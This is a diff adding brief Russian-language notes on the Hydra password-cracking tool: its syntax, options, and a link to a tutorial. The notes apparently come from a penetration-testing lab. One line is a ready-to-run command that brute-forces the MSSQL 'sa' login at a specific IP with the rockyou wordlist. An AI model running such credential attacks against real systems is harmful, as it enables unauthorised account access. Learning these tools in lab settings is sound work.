@@ -1,0 +1,13 @@
+hydra [-l имя | -L файл с именами ] [-p пароль | -P словарь] протокол://хост 
+
+-s порт (указание нестандартного порта)
+-v (verbose)
+-V (very verbose)
+-t указание поточности (аля скорости, по умолчанию 16)
+-o запись результатов в файл
+-С (комбинированный файл формата login:password)
+hydra -l sa -P /usr/share/wordlists/rockyou.txt -t 64 -s 6520 mssql://10.129.244.81
+
+hydra -C <файл> протокол://хост
+
+https://skyeng.ru/it-industry/it/kak-ispolzovat-hydra-v-kali-linux-poshagovoye-rukovodstvo/
